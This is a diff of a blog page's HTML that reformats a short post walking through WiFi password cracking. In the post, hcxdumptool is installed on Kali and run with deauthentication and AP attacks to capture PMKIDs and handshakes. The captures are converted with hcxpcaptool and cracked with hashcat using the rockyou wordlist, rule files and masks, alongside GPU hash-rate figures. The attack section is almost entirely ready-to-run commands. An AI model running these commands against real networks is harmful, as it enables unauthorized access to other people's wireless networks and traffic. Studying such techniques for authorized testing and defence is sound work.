@@ -204,7 +204,7 @@
   
   
   &nbsp;|&nbsp;
-  <i class="fa fa-clock-o"></i> 2 minutes (294 words)
+  <i class="fa fa-clock-o"></i> 2 minutes (285 words)
   
   
 </span>
@@ -224,11 +224,7 @@
   <div class="row">
     <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
       <article role="main" class="blog-post">
-        
-
-<p>Posted without comment (no pun intended)</p>
-
-<!-- more --> 
+        <p>Posted without comment (no pun intended)</p>
 
 <p>Don&rsquo;t try this at home, kids!</p>
 
@@ -242,32 +238,31 @@
 <li><p>Boot <a href="https://www.kali.org/downloads/" target="_blank">Kali Light</a></p></li>
 
 <li><p>As of <strong>2019.03</strong>:</p>
+<div class="highlight"><pre class="chroma">apt-get update &amp;&amp; \
+apt-get -y upgrade &amp;&amp; \ 
+apt-get install -y gcc git make \ 
+                   libcurl4-openssl-dev libssl-dev zlib1g-dev         
 
-<p>apt-get update &amp;&amp; <br />
-  apt-get -y upgrade &amp;&amp; \<br />
-  apt-get install -y gcc git make \<br />
-                     libcurl4-openssl-dev libssl-dev zlib1g-dev</p>
+git clone https://github.com/ZerBea/hcxdumptool &amp;&amp; \ 
+          cd hcxdumptool &amp;&amp; \
+          make install
 
-<p>git clone <a href="https://github.com/ZerBea/hcxdumptool" target="_blank">https://github.com/ZerBea/hcxdumptool</a> &amp;&amp; \<br />
-            cd hcxdumptool &amp;&amp; <br />
-            make install</p>
+# run for 30 secs to confirm capabilities
+hcxdumptool -i interface --do_rcascan          
 
-<p># run for 30 secs to confirm capabilities<br />
-  hcxdumptool -i interface &ndash;do_rcascan</p>
+# you can add --filterlist=&lt;file&gt; or --ap_mac=&lt;mac_addr&gt;
+# default scan list: 1, 3, 5, 7, 9, 11, 13, 2, 4, 6, 8, 10, 12, 13
+hcxdumptool -i wlp39s0f3u4u5 -o haktheplanet.cap \
+            -T 5 -t 90 -D 100 -A 100 \
+            --give_up_ap_attacks=10 \
+            --give_up_deauthentications=10 \
+            --reactive_beacon \
+            --enable_status=3 
 
-<p># you can add &ndash;filterlist=<file> or &ndash;ap_mac=<mac_addr> if you prefer<br />
-  # default scan list: 1, 3, 5, 7, 9, 11, 13, 2, 4, 6, 8, 10, 12, 13<br />
-  hcxdumptool -i wlp39s0f3u4u5 -o haktheplanet.cap <br />
-              -T 5 -t 90 -D 100 -A 100 <br />
-              &ndash;give_up_ap_attacks=10 <br />
-              &ndash;give_up_deauthentications=10 <br />
-              &ndash;reactive_beacon <br />
-              &ndash;enable_status=3</p>
-
-<p># convert to usable format(s)<br />
-  hcxpcaptool -k haktheplanet.pmkid haktheplanet.cap<br />
-  hcxpcaptool -o haktheplanet.hashcat haktheplanet.cap<br />
-  hcxpcaptool -O haktheplanet.raw.hashcat haktheplanet.cap</p></li>
+# convert to usable format(s)
+hcxpcaptool -k haktheplanet.pmkid haktheplanet.cap 
+hcxpcaptool -o haktheplanet.hashcat haktheplanet.cap 
+hcxpcaptool -O haktheplanet.raw.hashcat haktheplanet.cap </pre></div></li>
 </ul>
 
 <hr />
@@ -275,35 +270,51 @@
 <h2 id="back-at-the-bat-cave">Back At The Bat Cave</h2>
 
 <ul>
-<li>Hashmode: 2500<br />
-<br /></li>
-</ul>
+<li><p>Hashmode: 2500</p>
 
-<p>| GPU | kH/s |<br />
-  |&mdash;|&mdash;|<br />
-  | RX5700XT | 474.1 |<br />
-  | GTX1070 | 297.8 |<br />
-  | RX580 | 224.0 |</p>
+<table>
+<thead>
+<tr>
+<th>GPU</th>
+<th>kH/s</th>
+</tr>
+</thead>
 
-<ul>
+<tbody>
+<tr>
+<td>RX5700XT</td>
+<td>474.1</td>
+</tr>
+
+<tr>
+<td>GTX1070</td>
+<td>297.8</td>
+</tr>
+
+<tr>
+<td>RX580</td>
+<td>224.0</td>
+</tr>
+</tbody>
+</table></li>
+
 <li><p>Use <code>-m 16800</code> for PMKIDs or <code>-m 2500</code> regular hashcats</p>
+<div class="highlight"><pre class="chroma">curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/  download/data/rockyou.txt
 
-<p>curl -L -o rockyou.txt <a href="https://github.com/brannondorsey/naive-hashcat/releases/" target="_blank">https://github.com/brannondorsey/naive-hashcat/releases/</a>  download/data/rockyou.txt</p>
+# low hanging fruit, how does this still work lulz
+hashcat -m 2500 -a 0 haktheplanet.hashcat rockyou.txt --potfile-path   haktheplanet.naive.win
 
-<p># low hanging fruit, how does this still work lulz<br />
-  hashcat -m 2500 -a 0 haktheplanet.hashcat rockyou.txt &ndash;potfile-path   haktheplanet.naive.win</p>
+# kay time for rules
+hashcat -m 2500 -a 0 haktheplanet.hashcat rockyou.txt -r ./rules/d3ad0ne.rule   --potfile-path haktheplanet.deadone.win
 
-<p># kay time for rules<br />
-  hashcat -m 2500 -a 0 haktheplanet.hashcat rockyou.txt -r ./rules/d3ad0ne.rule   &ndash;potfile-path haktheplanet.deadone.win</p>
+# this isnt the slowest
+hashcat -m 2500 -a 0 haktheplanet.hashcat rockyou.txt -r ./rules/rockyou-30000.rule   --potfile-path      haktheplanet.rocku.win
 
-<p># this isnt the slowest<br />
-  hashcat -m 2500 -a 0 haktheplanet.hashcat rockyou.txt -r ./rules/rockyou-30000.rule   &ndash;potfile-path haktheplanet.rocku.win</p>
+# dive isnt fast
+hashcat -m 2500 -a 0 haktheplanet.hashcat rockyou.txt -r ./rules/dive.rule   --potfile-path haktheplanet.dive.win
 
-<p># dive isnt fast<br />
-  hashcat -m 2500 -a 0 haktheplanet.hashcat rockyou.txt -r ./rules/dive.rule   &ndash;potfile-path haktheplanet.dive.win</p>
-
-<p># GLHF ¯_(ツ)_/¯<br />
-  hashcat -m 2500 -a 3 haktheplanet.hashcat ./masks/rockyou-1-60.hcmask &ndash;potfile-path   haktheplanet.mask.win</p></li>
+# GLHF ¯\_(ツ)_/¯
+hashcat -m 2500 -a 3 haktheplanet.hashcat ./masks/rockyou-1-60.hcmask --potfile-path   haktheplanet.mask.win</pre></div></li>
 </ul>
 
 <hr />
@@ -332,7 +343,6 @@
 <li>pyrit, tshark, cowpatty, aircrack-ng: <a href="https://github.com/derv82/wifite2" target="_blank">https://github.com/derv82/wifite2</a><br /></li>
 <li><a href="https://twitter.com/wishbone1138" target="_blank">Josh Hoover</a> n <a href="https://www.defcon.org/images/defcon-21/dc-21-presentations/djwishbone-PuNk1nPo0p/DEFCON-21-djwishbone-PuNk1nPo0p-BYO-Disaster-Updated.pdf" target="_blank">PunK1nPO0P</a> DEFCON21: <a href="https://www.youtube.com/watch?v=-uqTqJwTFyU&amp;feature=youtu.be&amp;t=22m34s" target="_blank">Why Corporate Wireless Security Still Sucks</a><br /></li>
 </ul>
-
 
         
           <div class="blog-tags">
